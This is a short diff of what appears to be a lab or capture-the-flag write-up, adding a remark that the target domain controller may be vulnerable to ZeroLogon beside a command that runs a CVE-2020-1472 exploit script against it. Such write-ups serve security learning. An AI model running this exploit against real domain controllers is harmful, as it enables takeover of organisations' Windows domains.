@@ -264,6 +264,8 @@ C:\Windows\system32>
 
 
 ## ZeroLogon
+Past expience also tells me this version can be vulnerable to zerologon
+
 ```python
 python3 cve-2020-1472-exploit.py casc-dc1 10.129.18.9 
 Performing authentication attempts...
